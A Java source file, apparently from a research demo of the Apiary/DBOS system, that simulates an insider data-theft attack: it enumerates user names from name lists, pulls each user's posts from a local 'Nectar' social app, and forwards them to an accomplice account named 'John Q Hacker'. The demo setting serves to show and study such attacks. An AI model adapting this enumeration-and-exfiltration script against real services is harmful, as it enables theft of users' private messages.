package org.dbos.apiary.rsademo.executable;

import org.dbos.apiary.client.ApiaryWorkerClient;
import org.json.simple.JSONObject;
import org.json.simple.JSONValue;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class ExfiltratePosts {

    private static final Logger logger = LoggerFactory.getLogger(ExfiltratePosts.class);

    private static final String associateName = "John Q Hacker";

    public static void exfiltratePosts() throws IOException, InterruptedException {
        ApiaryWorkerClient client = new ApiaryWorkerClient("localhost", "admin_2");
        List<String> names = getNames();

        client.executeFunction("NectarRegister", associateName, "password");

        for (String name: names) {
            System.out.println("Retrieving messages from: " + name);
            String[] posts = client.executeFunction("NectarGetPosts", name).getStringArray();
            if (posts != null) {
                System.out.println("Retrieve Successful");
            } else {
                System.out.println("Error: Retrieve failed.");
                break;
            }
            Thread.sleep(1000);
            System.out.println("Sending messages to: " + associateName);
            boolean success = true;
            for (String post : posts) {
                JSONObject obj = (JSONObject) JSONValue.parse(post);
                String sender = (String) obj.get("Sender");
                String postText = "Receiver: " + obj.get("Receiver") + ". Post: " + obj.get("PostText");
                int res = client.executeFunction("NectarAddPost", sender, associateName, postText).getInt();
                if (res == -1) {
                    success = false;
                }
            }
            if (success) {
                System.out.println("Exfiltration successful");
            } else {
                System.out.println("Error: Could not send messages");
            }
        }
    }


    private static List<String> getNames() throws IOException {
        String firstNamesFile = "src/main/resources/firstnames.txt";
        String lastNamesFile = "src/main/resources/lastnames.txt";
        String line;

        List<String> firstNames = new ArrayList<>();
        List<String> lastNames = new ArrayList<>();

        BufferedReader namesReader = new BufferedReader(new FileReader(firstNamesFile));
        while((line = namesReader.readLine()) != null) {
            firstNames.add(line);
        }
        namesReader.close();
        namesReader = new BufferedReader(new FileReader(lastNamesFile));
        while((line = namesReader.readLine()) != null) {
            lastNames.add(line);
        }

        List<String> names = new ArrayList<>();
        for (String firstName: firstNames) {
            for (String lastName: lastNames) {
                names.add(firstName + " " + lastName);
            }
        }

        return names;
    }
}
